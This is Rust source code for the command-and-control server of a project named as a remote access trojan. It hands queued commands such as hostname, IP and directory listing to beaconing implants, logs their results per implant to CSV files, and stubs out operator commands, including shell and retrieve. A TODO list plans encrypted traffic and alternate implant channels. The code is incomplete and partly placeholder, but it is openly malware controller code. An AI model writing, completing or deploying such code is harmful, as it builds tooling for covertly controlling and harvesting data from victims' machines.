use remote_access_trojan::rat::ask_for_instructions_server::{
    AskForInstructions, AskForInstructionsServer,
};
use remote_access_trojan::rat::record_command_result_server::{
    RecordCommandResult, RecordCommandResultServer,
};
use remote_access_trojan::rat::schedule_command_server::{ScheduleCommand, ScheduleCommandServer};
use remote_access_trojan::rat::{Beacon, CommandRequest, CommandResponse, Empty};
use remote_access_trojan::rat::{OperatorCommand, OperatorRequest, OperatorResponse, RatCommand};
use remote_access_trojan::RsRatCommand;
use std::collections::HashMap;
use std::convert::From;
use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;
use tonic::transport::Server;
use tonic::{Request, Response, Status};

/*
TODO
    - server state mutable
    - accept commands from operator to server
    - server 'retrieve' command
    - server 'implants' command
    - encrypt traffic from implant to server
    - encrypt traffic from operator to server
    - alternate communication method(s) between implant and server
*/

#[derive(Default)]
pub struct MyAskForInstructions {}

#[tonic::async_trait]
impl AskForInstructions for MyAskForInstructions {
    async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
        // This will get removed when I have a client
        let fake_commands = HashMap::from([
            (0, (RatCommand::Hostname, "".to_string())),
            (1, (RatCommand::Ip, "".to_string())),
            (2, (RatCommand::Ls, "".to_string())),
            (3, (RatCommand::Cadence, "2".to_string())),
        ]);
        // Get the command number that the implant is requesting
        let command_number: usize = request.into_inner().requested_command.try_into().unwrap();
        // If the command number exists in the server already, send it back to the implant to run
        // Otherwise, send the 'None' command, which tells the implant there is nothing new
        if fake_commands.len() > command_number {
            Ok(Response::new(CommandRequest {
                command: RatCommand::try_into(fake_commands[&command_number].0).unwrap(),
                arguments: fake_commands[&command_number].1.clone(),
            }))
        } else {
            Ok(Response::new(CommandRequest {
                command: RatCommand::try_into(RatCommand::None).unwrap(),
                arguments: String::from(""),
            }))
        }
    }
}

#[derive(Default)]
pub struct MyRecordCommandResult {}

#[tonic::async_trait]
impl RecordCommandResult for MyRecordCommandResult {
    async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
        // Get the response from the implant and prepare it for recording
        let request = request.into_inner();
        let implant_id = request.implant_id;
        let timestamp = request.timestamp;
        let command: &str =
            RsRatCommand::from(RatCommand::from_i32(request.command).unwrap()).into();
        let arguments = request.arguments;
        let result = request.result;
        // Determine where the result should be written based on the implant ID
        let filename = format!("./{implant_id}.csv");
        // If the file already exists, the only data we need is in the implant's message
        let mut data = format!("{implant_id},{timestamp},{command},{arguments},{result}");
        // Otherwise, we also need to give the file a header
        if !Path::new(&filename).exists() {
            data = format!("timestamp,command,arguments,result\n{implant_id},{timestamp},{command},{arguments},{result}");
        }
        // Open the file and write the data to it
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(filename)
            .unwrap();
        writeln!(file, "{data}").unwrap();
        // Respond to the implant basically say 'done'
        Ok(Response::new(Empty {}))
    }
}

#[derive(Default)]
pub struct MyScheduleCommand {}

#[tonic::async_trait]
impl ScheduleCommand for MyScheduleCommand {
    async fn send(
        &self,
        request: Request<OperatorRequest>,
    ) -> Result<Response<OperatorResponse>, Status> {
        // Get the request from the operator and figure out what to do with it
        let inner = request.into_inner();
        let command = OperatorCommand::from_i32(inner.command).unwrap();
        let arguments = inner.arguments;
        // Run the applicable command
        let command_result = match command {
            OperatorCommand::OpCadence => {
                format!("got a cadence {arguments}!")
            },
            OperatorCommand::OpDir => {
                // Passthrough
                "got a dir".to_string()
            },
            OperatorCommand::OpImplants => {
                // List all implant IDs
                "got an implants".to_string()
            },
            OperatorCommand::OpHelp => {
                "Valid commands:\n\tcadence <number in seconds>\n\tdir\n\thostname\n\thelp\n\timplants\n\tip\n\tls\n\tos\n\tquit\n\tretrieve <implant id>\n\tshell\n\twhoami".to_string()
            },
            OperatorCommand::OpHostname => {
                // Passthrough
                "got a hostname".to_string()
            },
            OperatorCommand::OpIp => {
                // Passthrough
                "got an ip".to_string()
            },
            OperatorCommand::OpLs => {
                // Passthrough
                "got an ls".to_string()
            },
            OperatorCommand::OpOs => {
                // Passthrough
                "got an os".to_string()
            },
            OperatorCommand::OpQuit => {
                // Passthrough
                "got a quit".to_string()
            },
            OperatorCommand::OpRetrieve => {
                // Retrieve data from implant
                "got a retrieve".to_string()
            },
            OperatorCommand::OpShell => {
                // Passthrough
                "got a shell".to_string()
            },
            OperatorCommand::OpWhoami => {
                // Passthrough
                "got a whoami".to_string()
            },
            _ => {
                // I think this isn't possible?
                "uh oh".to_string()
            }
        };
        // Respond to the implant basically say 'done'
        Ok(Response::new(OperatorResponse {
            data: command_result,
        }))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Set up the server parameters
    let port = rco_config::RAT_SERVER_PORT;
    let socket = format!("127.0.0.1:{port}").parse()?;

    // Stand up the server and run it
    Server::builder()
        .add_service(AskForInstructionsServer::new(
            MyAskForInstructions::default(),
        ))
        .add_service(RecordCommandResultServer::new(
            MyRecordCommandResult::default(),
        ))
        .add_service(ScheduleCommandServer::new(MyScheduleCommand::default()))
        .serve(socket)
        .await?;

    Ok(())
}
